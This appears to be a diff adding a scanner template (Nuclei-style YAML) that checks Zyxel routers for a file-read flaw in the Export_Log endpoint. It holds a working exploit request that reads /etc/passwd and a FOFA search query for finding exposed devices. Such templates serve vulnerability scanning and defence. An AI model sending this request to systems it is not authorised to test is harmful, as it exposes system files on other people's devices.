@@ -1,0 +1,23 @@
+id: zyxel-routers-export_log-fileread
+
+info:
+  name: zyxel-routers-export_log-fileread
+  author: HackTwo
+  severity: high
+  description: zyxel 路由器 export_log存在文件读取漏洞。
+  tags:  zyxel,fileread
+  metadata:
+    fofa-qeury: body="ZyXEL"
+
+http:
+  - raw:
+      - |              
+        GET /Export_Log?/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body, "root:x:") && contains(header, "application/octet-stream")'
